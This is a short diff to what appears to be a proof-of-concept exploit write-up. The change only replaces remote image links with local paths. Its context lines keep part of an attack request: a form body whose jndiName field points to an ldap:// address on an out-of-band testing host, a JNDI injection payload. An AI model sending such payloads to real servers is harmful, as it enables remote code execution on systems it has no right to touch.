@@ -32,13 +32,13 @@ Content-Type: application/x-www-form-urlencoded
 name=nobg7&jndiName=ldap://cm38sdn1l3f79d1jb0jgoahe856jrdjkg.oast.site/ahsdhashduqwe&dbtype=mysql&drivertype=&host=127.0.0.1&port=3306&dbname=nobg7&userName=nobg7&password=nobg7&repassword=nobg7&connectionURL=sdasd&driverClassName=java.lang.String&testCommand=
 ```
 
-![a519acd405e2e60c00108378f8410c8d](https://github.com/wy876/POC/assets/139549762/faa32ae9-f7b0-4a76-9990-74635d28bd2f)
+![a519acd405e2e60c00108378f8410c8d](../../images/faa32ae9-f7b0-4a76-9990-74635d28bd2f.png)
 
-![1dc3f827f335c01618f9dd9c4b39832b](https://github.com/wy876/POC/assets/139549762/6eff9f3b-df75-4008-b713-db61a32739bd)
+![1dc3f827f335c01618f9dd9c4b39832b](../../images/6eff9f3b-df75-4008-b713-db61a32739bd.png)
 
-![584c726b09f954433d5c3248ac5c1368](https://github.com/wy876/POC/assets/139549762/dfe99f4f-d6eb-4869-a2f8-59d792d9dac4)
+![584c726b09f954433d5c3248ac5c1368](../../images/dfe99f4f-d6eb-4869-a2f8-59d792d9dac4.png)
 
-![02678af9ca19b8ee1104c874943e5f94](https://github.com/wy876/POC/assets/139549762/09aba93a-9c71-4924-9314-28f054ce2fd7)
+![02678af9ca19b8ee1104c874943e5f94](../../images/09aba93a-9c71-4924-9314-28f054ce2fd7.png)
 
 
 ##漏洞来源
